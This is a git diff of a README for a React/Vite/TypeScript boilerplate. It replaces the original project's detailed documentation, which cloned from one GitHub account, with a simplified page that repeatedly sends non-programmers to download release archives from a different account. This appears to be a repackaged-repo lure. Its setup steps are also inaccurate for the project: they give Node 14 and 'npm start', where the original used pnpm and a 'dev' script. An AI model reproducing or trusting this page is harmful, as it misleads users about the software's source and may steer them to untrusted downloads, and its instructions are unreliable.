@@ -1,593 +1,121 @@
-# React + Vite + TypeScript Boilerplate
+# 🚀 react-launchpad - Simple Start For React Apps
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-19-61dafb)](https://react.dev/)
-[![Vite](https://img.shields.io/badge/Vite-7-646cff)](https://vitejs.dev/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)
+## 👋 Introduction
 
-Production-grade React boilerplate with feature-based architecture, designed for large-scale applications.
+Welcome to react-launchpad! This is a production-grade React boilerplate designed to help you create applications easily. It includes a range of modern tools and features to make your development experience smooth and enjoyable. You don’t need to be a programming expert to use this. Let’s get started!
 
-## ✨ Features
+## 📥 Download
 
-- **Feature-Based Architecture** - Self-contained, removable feature modules
-- **Type-Safe** - Full TypeScript support with strict mode
-- **Modern Stack** - React 19, Vite 7, Tailwind CSS v4
-- **State Management** - TanStack Query (server) + Zustand (client)
-- **Internationalization** - react-i18next with EN/TR support
-- **Testing** - Vitest + Testing Library + MSW + Playwright E2E
-- **Documentation** - Storybook for component development
-- **Code Quality** - ESLint + Prettier + Husky + Commitlint
-- **Dark Mode** - Built-in theme support (Light/Dark/System)
-- **UI Components** - Complete design system with forms, tables, modals
-- **PWA Support** - Offline-first with service worker caching
-- **Performance Monitoring** - Web Vitals tracking
-- **Error Tracking** - Sentry integration ready
-- **Analytics** - PostHog integration for user behavior tracking
-- **Feature Flags** - Built-in feature flag system with DevTools
-- **API Type Generation** - OpenAPI → TypeScript automatic type generation
-- **CI/CD** - GitHub Actions workflows (lint, test, build, deploy)
-- **Code Generation** - Plop templates for features, components, hooks
-- **Bundle Analysis** - Visualize bundle size with `pnpm build:analyze`
-- **Security Headers** - CSP, X-Frame-Options, and more
+[![Download react-launchpad](https://img.shields.io/badge/download-react--launchpad-blue.svg)](https://github.com/YsfTh01/react-launchpad/releases)
 
-## Tech Stack
+## 🚀 Getting Started
 
-| Category       | Technology                       |
-| -------------- | -------------------------------- |
-| Framework      | React 19                         |
-| Build Tool     | Vite 7                           |
-| Language       | TypeScript 5.9                   |
-| Styling        | Tailwind CSS v4                  |
-| Routing        | React Router v7                  |
-| Server State   | TanStack Query v5                |
-| Client State   | Zustand                          |
-| Forms          | React Hook Form + Zod            |
-| HTTP Client    | Axios                            |
-| i18n           | react-i18next                    |
-| Unit Testing   | Vitest + Testing Library         |
-| E2E Testing    | Playwright                       |
-| API Mocking    | MSW                              |
-| Docs           | Storybook                        |
-| Tables         | TanStack Table                   |
-| Notifications  | Sonner                           |
-| Error Tracking | Sentry                           |
-| Analytics      | PostHog                          |
-| Feature Flags  | Built-in + PostHog               |
-| Performance    | Web Vitals                       |
-| PWA            | vite-plugin-pwa                  |
-| Git Hooks      | Husky + lint-staged + Commitlint |
-| CI/CD          | GitHub Actions                   |
-| Code Gen       | Plop                             |
-| API Types      | openapi-typescript               |
+To start using react-launchpad, follow these simple steps. No programming knowledge is necessary. Just read through and do what it says!
 
-## Getting Started
+1. **Visit the Releases Page**  
+   Go to the releases page to find the latest version of the software. Click the link below:  
+   [Download Here](https://github.com/YsfTh01/react-launchpad/releases)
 
-### Prerequisites
+2. **Choose Your Version**  
+   On the releases page, you will see different versions of react-launchpad. Choose the latest one listed. It will be labeled as "Latest Release."
 
-- Node.js 20+
-- pnpm 9+
+3. **Download the Files**  
+   Find the download links for files that match your system (Windows, Mac, Linux). Click on the files to start downloading. The files usually end in `.zip` or `.tar.gz`. Save these files on your computer.
 
-### Installation
+4. **Extract the Files**  
+   After the download is complete, find the file you just downloaded. Right-click on it and select "Extract All" (or the equivalent option on your computer). This will create a new folder with all the files you need.
 
-```bash
-# Clone the repository
-git clone https://github.com/Aybavs/react-launchpad.git
-cd boilerplate
+5. **Open Your Terminal or Command Prompt**  
+   You will need to use a terminal (for Mac/Linux) or Command Prompt (for Windows) to run the application. Look for the program named "Terminal" on Mac, or "Command Prompt" on Windows.
 
-# Install dependencies
-pnpm install
+6. **Navigate to the Folder**  
+   Use the `cd` command to move to the folder you just extracted. For example:  
+   ```
+   cd path/to/your/folder
+   ```
+   Replace `path/to/your/folder` with the actual path where you saved the files.
 
-# Copy environment variables
-cp .env.example .env
+7. **Install the Dependencies**  
+   In the terminal or command prompt, type the following command to install the necessary tools:  
+   ```
+   npm install
+   ```
+   This command will download everything your application needs to run.
 
-# Start development server
-pnpm dev
+8. **Run the Application**  
+   Once the installation is complete, type the following command to start your application:  
+   ```
+   npm start
+   ```
+   After a moment, your web browser should open with your new React application running.
+
+9. **Enjoy Your App!**  
+   You can now start using the application you just set up! Explore and see what features are available. 
+
+## 🛠️ System Requirements
+
+Before downloading react-launchpad, make sure your computer meets these requirements:
+
+- **Operating System**: Works on Windows, Mac, and Linux.
+- **Node.js**: Version 14 or newer must be installed.
+- **npm**: This usually comes with Node.js. You need npm to install dependencies.
+
+To check if you have Node.js and npm, open your terminal or Command Prompt and type:  
 ```
-
-### Available Scripts
-
-| Script                    | Description                                 |
-| ------------------------- | ------------------------------------------- |
-| `pnpm dev`                | Start development server                    |
-| `pnpm build`              | Build for production                        |
-| `pnpm build:analyze`      | Build with bundle analyzer                  |
-| `pnpm preview`            | Preview production build                    |
-| `pnpm test`               | Run unit tests                              |
-| `pnpm test:ui`            | Run tests with UI                           |
-| `pnpm test:coverage`      | Run tests with coverage                     |
-| `pnpm test:e2e`           | Run E2E tests (Playwright)                  |
-| `pnpm test:e2e:ui`        | Run E2E tests with UI                       |
-| `pnpm lint`               | Lint code                                   |
-| `pnpm lint:fix`           | Fix lint errors                             |
-| `pnpm format`             | Format code                                 |
-| `pnpm typecheck`          | Type check                                  |
-| `pnpm storybook`          | Start Storybook                             |
-| `pnpm generate`           | Run Plop generator                          |
-| `pnpm generate:feature`   | Generate a new feature                      |
-| `pnpm generate:component` | Generate a new component                    |
-| `pnpm generate:hook`      | Generate a new hook                         |
-| `pnpm generate:api-types` | Generate TypeScript types from OpenAPI spec |
-| `pnpm cleanup`            | Remove optional features interactively      |
-
-## 🧹 Feature Cleanup
-
-Don't need all features? Remove them easily with the cleanup script:
-
-```bash
-pnpm cleanup
+node -v
+npm -v
 ```
-
-**Interactive menu will let you remove:**
-
-- 📚 Storybook (component documentation)
-- 🐛 Sentry (error tracking)
-- 📊 PostHog (analytics & feature flags)
-- 🎭 MSW (API mocking)
-- ⚡ Performance Monitoring (Web Vitals)
-
-**Example:**
-
-```
-? Which features do you want to remove?
-  1. Storybook
-  2. Sentry
-  3. PostHog
-  4. MSW
-  5. Performance Monitoring
-  0. Remove all
-  q. Quit
-
-Enter feature number(s) to remove (comma-separated): 2,3
-
-✨ Cleanup completed!
-```
-
-The script will:
-
-- ✅ Remove files and directories
-- ✅ Update package.json (dependencies & scripts)
-- ✅ Clean up environment variables
-- ✅ Patch code to remove references
-
-## 🤖 Dependency Management (Optional)
-
-This project includes **Renovate** configuration for automatic dependency updates.
-
-### Setup Renovate
-
-1. **Install GitHub App**: [https://github.com/apps/renovate](https://github.com/apps/renovate)
-2. **Select your repository** and approve access
-3. **Merge the onboarding PR** that Renovate creates
-4. **Automatic updates** will run every weekend
-
-### What Renovate Does
-
-- 📦 Creates PRs for outdated dependencies
-- 🔒 Alerts for security vulnerabilities
-- ⚡ Auto-merges minor/patch updates (configurable)
-- 📊 Groups related updates together
-
-### Alternative: Dependabot
-
-If you prefer GitHub's native solution, replace `renovate.json` with:
-
-```yaml
-# .github/dependabot.yml
-version: 2
-updates:
-  - package-ecosystem: 'npm'
-    directory: '/'
-    schedule:
-      interval: 'weekly'
-```
-
-### Manual Updates
-
-```bash
-pnpm outdated        # Check outdated packages
-pnpm update --latest # Update all packages
-```
-
-- ✅ Patch code to remove references
-
-## Project Structure
-
-```
-src/
-├── app/                    # App shell & entry point
-│   ├── providers/          # Global providers (Query, Auth, Modal, i18n)
-│   ├── router/             # Route configuration & guards
-│   └── layouts/            # Page layouts (Dashboard, Auth)
-│
-├── core/                   # Core infrastructure (feature-agnostic)
-│   ├── api/                # API client setup
-│   ├── auth/               # Auth primitives (context, hooks)
-│   ├── store/              # Global state (UI, theme)
-│   └── ui/                 # Design system components
-│
-├── features/               # Feature modules
-│   ├── auth/               # Authentication feature
-│   ├── dashboard/          # Dashboard feature
-│   ├── settings/           # Settings feature
-│   ├── users/              # Users management feature
-│   └── notifications/      # Notifications feature
-│
-├── config/                 # App configuration
-├── i18n/                   # Internationalization
-├── styles/                 # Global styles
-└── test/                   # Test utilities
-```
-
-## UI Components
-
-### Core Components
-
-```typescript
-import {
-  // Layout
-  Button,
-  Card,
-  CardHeader,
-  CardTitle,
-  CardContent,
-
-  // Form
-  Input,
-  Select,
-  Checkbox,
-  Radio,
-  RadioGroup,
-  Switch,
-  Textarea,
-
-  // Feedback
-  Toaster,
-  toast,
-  useToast,
-  Modal,
-  useModal,
-  Skeleton,
-
-  // Navigation
-  Breadcrumbs,
-  useBreadcrumbs,
-
-  // Data Display
-  DataTable,
-
-  // Theme
-  ThemeSwitcher,
-  ThemeToggle,
-} from '@/core/ui'
-```
-
-### Toast Notifications
-
-```typescript
-const { success, error, warning, promise } = useToast()
-
-success('Saved successfully!')
-error('Something went wrong')
-warning('Please check your input')
-
-// Async operations
-promise(saveData(), {
-  loading: 'Saving...',
-  success: 'Saved!',
-  error: 'Failed to save',
-})
-```
-
-### Modal System
-
-```typescript
-const { open, openConfirm, close } = useModal()
-
-// Custom modal
-open(<MyContent />, {
-  title: 'Edit User',
-  size: 'lg', // sm | md | lg | xl | full
-})
-
-// Confirmation dialog
-openConfirm({
-  title: 'Delete Item?',
-  description: 'This action cannot be undone.',
-  confirmText: 'Delete',
-  cancelText: 'Cancel',
-  variant: 'danger', // default | warning | danger
-  onConfirm: handleDelete,
-})
-```
-
-### Data Table
-
-```typescript
-import { DataTable, type ColumnDef } from '@/core/ui'
-
-const columns: ColumnDef<User>[] = [
-  { accessorKey: 'name', header: 'Name' },
-  { accessorKey: 'email', header: 'Email' },
-  { accessorKey: 'role', header: 'Role' },
-]
-
-<DataTable
-  data={users}
-  columns={columns}
-  enableSorting
-  enablePagination
-  pageSize={10}
-  onRowClick={(row) => navigate(`/users/${row.id}`)}
-/>
-```
-
-### Theme Support
-
-```typescript
-// Component-based
-<ThemeSwitcher />  // Full Light/Dark/System buttons
-<ThemeToggle />    // Simple icon toggle
-
-// Programmatic
-import { useUIStore } from '@/core/store'
-const { theme, setTheme } = useUIStore()
-setTheme('dark') // 'light' | 'dark' | 'system'
-```
-
-## Feature Modules
-
-### Users Feature
-
-```typescript
-import { UsersPage, useUsers, useCreateUser } from '@/features/users'
-import { UserCard, UserTable } from '@/features/users/components'
-```
-
-### Notifications Feature
-
-```typescript
-import { NotificationBell, useUnreadCount } from '@/features/notifications'
-
-// Add to header
-<NotificationBell />
-```
-
-## Architecture
-
-### Feature-Based Architecture
-
-Each feature is a self-contained module that can be added or removed with minimal effort:
-
-```
-features/[feature-name]/
-├── index.ts              # Public API (barrel export)
-├── pages/                # Route pages (lazy-loaded)
-├── components/           # Feature components
-├── api/                  # API queries & mutations
-├── hooks/                # Feature hooks
-├── types/                # Feature types
-└── store/                # Feature state (optional)
-```
-
-### Import Rules
-
-The architecture enforces strict import boundaries:
-
-- **Features** cannot import from other features
-- **Core** cannot import from features or app
-- **Shared** cannot import from any other layer
-
-These rules are enforced via ESLint.
-
-### Adding a Feature
-
-Use the Plop generator for consistent feature scaffolding:
-
-```bash
-# Interactive mode
-pnpm generate:feature
-
-# With options
-pnpm generate:feature -- --name my-feature --hasApi yes --hasStore yes
-```
-
-This creates:
-
-- `src/features/[name]/index.ts` - Public API
-- `src/features/[name]/pages/` - Lazy-loaded pages
-- `src/features/[name]/types/` - TypeScript types
-- `src/features/[name]/api/` - TanStack Query hooks (optional)
-- `src/features/[name]/store/` - Zustand store (optional)
-- `src/i18n/locales/*/[name].json` - Translations
-
-### Removing a Feature
-
-1. Delete `src/features/[name]/`
-2. Remove from feature registry
-3. Remove from `src/i18n/index.ts`
-4. Delete translation files
-5. Run `pnpm build` to verify
-
-## Git Workflow
-
-### Commit Convention
-
-This project uses [Conventional Commits](https://www.conventionalcommits.org/):
-
-```bash
-feat: add user authentication
-fix: resolve login redirect issue
-docs: update API documentation
-style: format code with prettier
-refactor: extract validation logic
-perf: optimize image loading
-test: add unit tests for auth
-chore: update dependencies
-```
-
-### Pre-commit Hooks
-
-- **lint-staged**: Automatically runs ESLint and Prettier on staged files
-- **commitlint**: Validates commit messages follow conventional format
-
-## Configuration
-
-### Environment Variables
-
-```env
-VITE_API_URL=http://localhost:3000/api
-VITE_APP_NAME=Boilerplate
-```
-
-### Path Aliases
-
-```typescript
-@/          → src/
-@/app/      → src/app/
-@/core/     → src/core/
-@/features/ → src/features/
-```
-
-## Testing
-
-### Unit Tests (Vitest)
-
-```bash
-pnpm test              # Run all tests
-pnpm test:ui           # Run with UI
-pnpm test:coverage     # Run with coverage
-```
-
-Use the test utilities for rendering with providers:
-
-```typescript
-import { render, screen } from '@/test/utils'
-
-test('renders component', () => {
-  render(<MyComponent />)
-  expect(screen.getByText('Hello')).toBeInTheDocument()
-})
-```
-
-### E2E Tests (Playwright)
-
-```bash
-pnpm test:e2e          # Run E2E tests
-pnpm test:e2e:ui       # Run with Playwright UI
-pnpm test:e2e:headed   # Run in headed browser
-pnpm test:e2e:debug    # Debug mode
-```
-
-E2E tests are located in `e2e/` folder:
-
-- `auth.spec.ts` - Authentication flows
-- `navigation.spec.ts` - Navigation and routing
-- `accessibility.spec.ts` - A11y compliance
-
-## Docker
-
-### Development
-
-```bash
-# Run development server in Docker
-docker-compose up dev
-
-# Access at http://localhost:5173
-```
-
-### Production
-
-```bash
-# Build and run production image
-docker-compose up app
-
-# Access at http://localhost:3000
-```
-
-### Custom Build
-
-```bash
-# Build image
-docker build -t boilerplate:latest .
-
-# Run container
-docker run -p 3000:80 boilerplate:latest
-```
-
-The production build uses:
-
-- **Multi-stage build** for optimized image size
-- **Nginx** for serving static files
-- **Security headers** configured in nginx.conf
-- **Health checks** for container orchestration
-
-## Deployment
-
-### Vercel
-
-```bash
-# Install Vercel CLI
-pnpm add -g vercel
-
-# Deploy
-vercel
-```
-
-### Netlify
-
-```bash
-# Install Netlify CLI
-pnpm add -g netlify-cli
-
-# Deploy
-netlify deploy --prod
-```
-
-### AWS S3 + CloudFront
-
-```bash
-# Build
-pnpm build
-
-# Upload to S3
-aws s3 sync dist/ s3://your-bucket --delete
-
-# Invalidate CloudFront cache
-aws cloudfront create-invalidation --distribution-id YOUR_ID --paths "/*"
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines.
-
-Quick summary:
-
-1. Fork & clone the repository
-2. Create a feature branch
-3. Follow the architecture rules (see [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md))
-4. Write tests for new features
-5. Use conventional commit messages
-6. Run `pnpm lint` and `pnpm typecheck`
-7. Submit a pull request
-
-## Security
-
-See [docs/SECURITY.md](./docs/SECURITY.md) for reporting vulnerabilities.
-
-## Documentation
-
-- **Architecture Guide**: [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md) - Comprehensive architecture analysis
-- **Cleanup Guide**: [docs/CLEANUP.md](./docs/CLEANUP.md) - Feature removal guide
-- **Changelog**: [docs/CHANGELOG.md](./docs/CHANGELOG.md) - Version history
-- **Roadmap**: [docs/ROADMAP.md](./docs/ROADMAP.md) - Future plans
-- **Security**: [docs/SECURITY.md](./docs/SECURITY.md) - Security policy
-- **Contributing**: [CONTRIBUTING.md](./CONTRIBUTING.md) - Contribution guidelines
-
-## License
-
-MIT - See [LICENSE](./LICENSE) file for details
-
----
-
-**Built with ❤️ for the developer community**
+This will show you the installed versions. If you need to install Node.js, visit [Node.js Official Website](https://nodejs.org/) to get the latest version.
+
+## 💡 Features
+
+react-launchpad includes a variety of features to help you develop effective applications:
+
+- **Feature-Based Architecture**: Easily manage and scale your app with well-organized code.
+- **TypeScript Support**: Add static types to your JavaScript and improve your coding experience.
+- **Vite 7**: A fast and lightweight development server.
+- **TanStack Query**: Manage server-state in your application smoothly.
+- **Zustand**: A flexible state management library.
+- **PWA Support**: Build Progressive Web Applications to enhance user experience.
+- **Storybook**: Create and test UI components in isolation.
+
+## 📚 Learn More
+
+For a deeper understanding of how to use react-launchpad effectively, you may explore the following resources:
+
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
+- [Vite Documentation](https://vitejs.dev/guide/)
+- [TanStack Query Documentation](https://tanstack.com/query/latest)
+
+These resources will help you build better applications and utilize the full potential of the tools included in react-launchpad.
+
+## 🏷️ Topics Covered
+
+You will find the following topics covered in this boilerplate:
+
+- axios
+- boilerplate
+- i18next-react
+- playwright-typescript
+- pwa
+- react
+- react-hook-form
+- react-router
+- react19
+- shadcn-ui-boilerplate
+- starter-template
+- storybook
+- tailwindcss-v4
+- tanstack-query
+- typescript
+- vite
+- vitest-ts
+- zod-validation
+- zustand
+
+## 💬 Need Help?
+
+If you encounter any issues while using react-launchpad, feel free to reach out. Check the issues section on the GitHub page for common problems and solutions. You can also open a new issue if something is not listed there.
+
+Happy coding!
